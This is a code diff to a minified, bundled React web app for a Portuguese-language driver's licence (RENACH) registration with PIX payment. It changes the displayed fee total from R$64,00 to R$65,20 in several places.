@@ -21328,7 +21328,7 @@ function RE() {
                     children: "Total:"
                   }), l.jsx("span", {
                     className: "whitespace-nowrap",
-                    children: "R$64,00"
+                    children: "R$65,20"
                   })]
                 })]
               })]
@@ -21676,7 +21676,7 @@ function DE() {
             className: "text-center mb-6",
             children: [l.jsxs("p", {
               className: "text-3xl font-bold text-green-600",
-              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "64,00"]
+              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "65,20"]
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Valor a ser pago"
@@ -21741,7 +21741,7 @@ function DE() {
               }), l.jsx("li", {
                 children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
-                children: "4. Confirme o pagamento de R$ 64,00"
+                children: "4. Confirme o pagamento de R$ 65,20"
               })]
             })]
           }), l.jsxs("div", {
@@ -22305,7 +22305,7 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
 • Taxa de Serviços Administrativos (TSA): R$ 21,50
 • Taxa de Processamento Eletrônico (TPE): R$ 25,50
 
-Valor Total: R$ 64,00`, 3e3), i("finalize_button")
+Valor Total: R$ 65,20`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22975,7 +22975,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,00, clique no botão 
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "64,00"
+                      children: "65,20"
                     })]
                   })]
                 })]
@@ -24890,4 +24890,5 @@ ov(document.getElementById("root")).render(l.jsx(x.StrictMode, {
     children: [l.jsx(dT, {}), l.jsx(fN, {})]
   })
 }));
+
 
